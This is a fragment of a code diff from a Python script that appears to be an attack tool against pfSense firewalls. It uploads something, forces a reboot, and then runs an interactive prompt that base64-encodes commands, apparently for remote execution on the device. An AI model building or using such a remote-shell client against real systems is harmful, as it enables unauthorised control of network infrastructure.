@@ -44,18 +44,21 @@ def leetUpload(details):
         print("Upload failed")
 
 
+    # I'm aware of how jank the follow lines are
+
     try:
-        cmdGET("reboot")
+        utils.cmdGET(details,"reboot")
     except:
-        print("Rebooting")
-        print("Please wait.....")
-        sleep(60)
+        # The command "fails" due to pfsense rebooting
+        print("Pfsense Rebooting.....")
+        
 
 
 def leetAccess(details):
-    cmd = ""
+    cmd = b"" 
+    encoding = "utf-8"
 
-    while(cmd != "fin"):
+    while(cmd.decode(encoding).lower() != "quit"):
         cmd = input("$: ").encode("ascii")
         cmd_encoded = base64.b64encode(cmd).decode("ascii")
 
